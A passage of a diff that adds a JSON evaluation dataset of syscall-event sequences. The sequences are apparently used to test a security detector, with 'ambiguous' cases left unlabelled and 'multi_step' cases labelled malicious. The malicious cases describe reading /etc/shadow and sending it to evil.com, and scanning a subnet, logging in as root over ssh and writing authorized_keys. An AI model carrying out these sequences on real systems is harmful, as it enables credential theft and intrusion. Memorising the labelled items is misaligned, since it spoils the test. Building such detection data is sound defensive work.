+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-025",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-026",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-027",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-028",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-029",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-030",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-031",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-032",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-033",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-034",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-035",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-036",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-037",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-038",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-039",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-040",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-041",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-042",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-043",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-044",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-045",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-046",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-047",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-048",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-049",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-050",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-051",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-052",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-053",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-054",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-055",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-056",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-057",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-058",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-059",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "MS-000",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-001",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-002",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-003",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-004",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-005",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-006",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-007",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-008",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-009",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-010",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-011",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-012",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-013",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-014",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-015",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-016",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-017",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-018",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-019",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-020",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-021",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-022",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-023",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-024",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-025",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-026",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-027",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
